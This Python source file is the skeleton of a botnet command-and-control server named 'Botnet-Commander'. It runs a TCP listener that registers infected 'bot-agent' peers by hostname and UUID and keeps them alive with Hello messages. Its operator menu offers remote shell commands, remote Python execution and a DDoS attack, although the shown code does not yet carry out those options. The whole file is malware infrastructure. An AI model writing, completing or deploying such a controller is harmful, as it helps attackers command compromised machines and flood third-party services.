import os
import asyncio
from threading import Thread
from pathlib import Path
import configparser
from logger import CoreLogger
from socket import socket, AF_INET, SOCK_STREAM


def load_conf():
    config_parser = configparser.ConfigParser()
    cwd_path = Path(__file__)
    root_dir = cwd_path.parent.absolute()
    try:
        config_path = os.path.join(root_dir, "cfg/commander.ini")
        config_parser.read(config_path)
        host = config_parser.get("CORE", "HOST")
        port = int(config_parser.get("CORE", "PORT"))
        log_level = int(config_parser.get("CORE", "LOG_LEVEL"))
        log_dir = config_parser.get("CORE", "LOG_DIR")
        log_name = config_parser.get("CORE", "LOG_NAME")
        conn_buff = int(config_parser.get("CORE", "CONN_BUFF"))
    except Exception as err:
        print("Error initializing CORE, Commander not started because config file could not be loaded. Unexpected "
              "exception occurred: {}".format(err))
        exit(5)
    return host, port, log_level, log_dir, log_name, conn_buff


class BotCommander:
    def __init__(self, host, port, conn_rcv):
        self.uuids = {}
        self.host = host
        self.port = port
        self.conn_rcv = conn_rcv
        self.sock = socket(AF_INET, SOCK_STREAM)
        self.user_thread = Thread(target=self.__get_user_input).start()
        asyncio.run(self.__run())

    @staticmethod
    def __print_help():
        print('''
        Welcome to Commander CLI!
        The following options are available:
        1) Execute shell/cmd commands
        2) Execute python script
        3) Perform DDOS attack         
        ''')

    def __get_user_input(self):
        self.__print_help()
        while True:
            val = 0
            cmd = input("Please insert a digit representing the option you want to choose: ")
            try:
                val = int(cmd)
            except ValueError:
                print("You have not inserted a digit, please insert a digit.")
            except Exception as err:
                print(f"An unexpected exception occurred while processing your choice. Please retry and insert a digit."
                      f" This is the error: {err}")
            if val in range(1, 4):
                return val
            else:
                print("Please insert a digit corresponding to one of the available options, 1, 2 or 3")

    async def __proces_keep_alive(self, reader, writer, addr, hostname, uuid):
        while True:
            try:
                data = await reader.read(self.conn_rcv)
            except Exception as err:
                logger.core.error(f"Unexpected exception when reading keep-alive hello from peer {hostname}: {err},"
                                  f" closing connection")
                writer.close()
                return
            if data:
                try:
                    msg = data.decode("utf-8")
                    if msg == "Hello":
                        logger.core.debug(f"Received Hello from bot-agent {hostname}:{addr}")
                        self.uuids[uuid] = (hostname, True)
                        logger.core.info(f"Bot-agent {hostname}:{addr} is still online")
                        try:
                            logger.core.debug(f"Sending HelloReply to bot-agent {hostname}:{addr}")
                            writer.write(b"HelloReply")
                        except Exception as err:
                            logger.core.error(f"Unexpected exception when sending HelloReply to {hostname}: {err},"
                                              f" closing connection")
                            writer.close()
                            return
                    else:
                        logger.core.error(f"Unknown message received from peer {hostname}:{addr}, expecting Hello."
                                          f" Closing connection")
                        writer.close()
                        return
                except Exception as err:
                    logger.core.error(f"Unexpected error while decoding data from peer {hostname}:{addr}. Expecting"
                                      f"hello for keep-alive: {err}")
                    writer.close()
                    return
            else:
                logger.core.error(f"EOF received when waiting for keep-alive hello from bot-agent {hostname}:{addr},"
                                  f" closing connection")
                writer.close()
                return

    async def __identify_agent(self, reader, writer):
        addr = writer.get_extra_info('peername')
        logger.core.info(f"Connection accepted from peer {addr}")
        hostname = await self.__get_hostname(reader, writer, addr)
        uuid = await self.__process_uuid(reader, writer, addr, hostname)
        asyncio.create_task(self.__proces_keep_alive(reader, writer, addr, hostname, uuid))

    async def __process_uuid(self, reader, writer, addr, hostname):
        try:
            data = await reader.read(self.conn_rcv)
        except Exception as err:
            logger.core.error(f"Unexpected exception when reading agent UUID from peer {hostname}: {err},"
                              f" closing connection")
            writer.close()
            return
        if not data:
            logger.core.error(f"Received EOF or empty response from peer {hostname}-{addr} when reading UUID")
            writer.close()
            return
        uuid = data.decode("utf-8")
        logger.core.debug(f"Received UUID {uuid} from peer {hostname}-{addr}")
        if uuid in self.uuids:
            logger.core.debug(f"Agent {self.uuids[uuid]} with UUID {uuid} already present in DB")
        else:
            online = True
            self.uuids[uuid] = (hostname, online)
            logger.core.debug(f"Successfully added agent {hostname}-{uuid} to DB")
        try:
            writer.write(b"getUUIDReply")
        except Exception as err:
            logger.core.error(f"Unexpected exception when sending getUUIDReply to {hostname}: {err},"
                              f" closing connection")
            writer.close()
            return
        return uuid

    @staticmethod
    def __get_uuid_payload():
        return "getUUID".encode("utf-8")

    async def __get_hostname(self, reader, writer, addr):
        try:
            data = await reader.read(self.conn_rcv)
        except Exception as err:
            logger.core.error(f"Unexpected exception when reading hostname from peer {addr}: {err},"
                              f" closing connection")
            return
        if not data:
            logger.core.error(f"Received EOF or empty response from peer {addr} when reading hostname")
            writer.close()
            return
        hostname = data.decode("utf-8")
        logger.core.debug(f"Received hostname {hostname} from peer {addr}")
        try:
            writer.write(b"getHostnameReply")
        except Exception as err:
            logger.core.error(f"Unexpected exception when sending getHostnameReply to {hostname}: {err},"
                              f" closing connection")
            writer.close()
            return
        return hostname

    async def __run(self):
        server = await asyncio.start_server(self.__identify_agent, self.host, self.port)

        addrs = ", ".join(str(self.sock.getsockname()) for self.sock in server.sockets)
        logger.core.info(f"Server started listener on {addrs}")

        async with server:
            await server.serve_forever()


if __name__ == "__main__":
    HOST, PORT, LOG_LEVEL, LOG_DIR, LOG_NAME, CONN_BUFF = load_conf()
    logger = CoreLogger(LOG_LEVEL, LOG_DIR, LOG_NAME)
    srv = BotCommander(HOST, PORT, CONN_BUFF)
    logger.core.info("Botnet-Commander exited")
